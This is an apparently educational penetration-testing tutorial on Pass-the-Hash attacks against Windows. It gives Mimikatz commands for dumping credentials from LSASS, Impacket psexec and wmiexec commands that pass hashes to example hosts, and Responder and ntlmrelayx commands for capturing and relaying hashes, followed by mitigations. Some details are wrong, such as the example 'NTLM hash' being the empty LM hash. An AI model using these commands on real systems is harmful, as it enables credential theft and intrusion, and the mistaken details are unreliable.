# **Pass-the-Hash (PtH) Attack**

## **Understanding Pass-the-Hash (PtH)**

- **Pass-the-Hash (PtH)** is a post-exploitation technique where attackers use stolen NTLM or NetNTLMv1/v2 hashes to authenticate as users without needing plaintext passwords.
- It exploits NTLM-based authentication protocols in Windows environments.
- This attack works because NTLM authentication can rely directly on hash values instead of the actual password.

## **Relation to NTLM and NetNTLM**

- **NTLM Hash:** A locally stored hash used by Windows for authentication.
- **NetNTLM Hash (NetNTLMv1/v2):** A challenge-response-based hash captured during network authentication.
- **Key Difference:**
  - **NTLM Hash:** Stored locally on systems (e.g., SAM, LSASS process).
  - **NetNTLM Hash:** Captured during network authentication (e.g., SMB, HTTP, LDAP).
- **PtH Attacks Target NTLM Hashes.** However, **NetNTLM hashes require cracking** or **relaying** to achieve access.

## **Tools and Techniques**

### **Mimikatz (NTLM PtH)**

**Mimikatz** is a well-known tool for extracting NTLM hashes from memory and conducting PtH attacks.

1. **Extract NTLM Hash from LSASS (Locally):**

```bash
privilege::debug
sekurlsa::logonpasswords
```

2. **Pass-the-Hash (PtH) with Mimikatz:**

```bash
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash>
```

- Replace `<username>`, `<domain>`, and `<hash>` with the target user's credentials.
- This spawns a new process with the passed hash.

---

### **Impacket (NetNTLM PtH)**

**Impacket** provides tools like `wmiexec`, `psexec`, and `smbexec` to execute commands on remote systems by passing NTLM hashes.

1. **Pass-the-Hash with Impacket's `psexec.py`**

```bash
psexec.py <domain>/<username>@<target_ip> -hashes <LM_HASH>:<NTLM_HASH>
```

- Example:

```bash
psexec.py corp.local/admin@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee
```

2. **wmiexec.py (Alternative for Remote Command Execution)**

```bash
wmiexec.py corp.local/user@192.168.1.5 -hashes aad3b435b51404eeaad3b435b51404ee
```

---

### **Responder (NetNTLM Capture and PtH)**

**Responder** can capture NetNTLM hashes and enable relay attacks.

1. **Start Responder to Capture Hashes:**

```bash
sudo responder -I eth0
```

2. **Relay Captured Hash to Target (NTLM Relay):**

```bash
ntlmrelayx.py -t <target_ip> -smb2support
```

---

## **Mitigation and Prevention**

- **Disable NTLM:** Use Kerberos or other secure protocols.
- **Enforce SMB Signing:** Prevent SMB relay attacks by enforcing message signing.
- **Implement LAPS:** Local Administrator Password Solution (LAPS) randomizes local admin passwords.
- **Network Segmentation:** Limit access to sensitive systems.
- **Monitor LSASS Access:** Regularly audit and monitor for unauthorized access to LSASS.
- **Patch and Update:** Ensure systems are updated to patch known vulnerabilities that allow credential dumping.

---

## **Important Notes**

- **Ethical Considerations:** Always obtain permission before conducting penetration tests.
- **Educational Purpose Only:** This document is meant for educational purposes and lawful penetration testing.

---

**⚠️Disclaimer⚠️** This guide is for ethical and educational use only. Unauthorized access to systems is illegal. Always ensure you have proper authorization before testing or exploiting any network or system.
